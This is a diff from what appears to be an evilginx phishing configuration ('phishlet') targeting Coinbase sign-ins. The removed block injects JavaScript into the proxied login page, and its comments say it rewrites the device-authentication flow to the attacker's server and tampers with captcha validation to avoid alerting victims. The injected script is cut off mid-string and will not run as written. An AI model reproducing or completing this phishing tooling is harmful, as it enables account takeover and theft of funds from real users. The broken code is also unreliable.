@@ -51,39 +51,3 @@ force_post:
 login:
   domain: 'login.coinbase.com'
   path: '/signin?'
-
-
-# "function lp()" will dynamically replace the contents in device authentication html page, and will create a new input box and button. Some other replacements are just to make page look better.
-# "function ValidateLink()" will replace the pdomain name 'coinbase.com' with the evilginx server domain name to verify the device from the IP of evilginx server, and will popup a new window with that modified auth link. 
-#  In that way we will be able to successfully authenticate the new device login.
-
-# "function hcaptcha()" will replace the domain name during the captcha validation to decrease the possibility of getting caught by the user.
-
-js_inject:
-  - trigger_domains: ["login.coinbase.com"]
-    trigger_paths: ["/signin?"]
-    trigger_params: [domain]
-    script: |
-      window.onload = function() {
-        lp0();
-        }
-      function lp0() {
-        try {
-            lp()
-        } catch (err) {
-            setTimeout(lp, 100);
-        }
-        };
-      function lp(){
-        var elem1 = document.getElementsByClassName("account-inner")[0];
-        elem1.parentNode.removeChild(elem1); 
-        var elem2 = document.getElementsByClassName("device-support")[0];
-        elem2.parentNode.removeChild(elem2);
-        var div = document.createElement('div');
-        div.className = 'account-inner';
-        div.innerHTML = `
-        <img class="account-icon" src="https://www.coinbase.com/assets/quickstart/icon-signup-9ed7432acbf85046d2a12f1e29f9e245d6e8376b379b524a1ebb6250c993f4d1.png">
-        
-      }
-      setTimeout(function(){ lp(); }, 3500);
-      
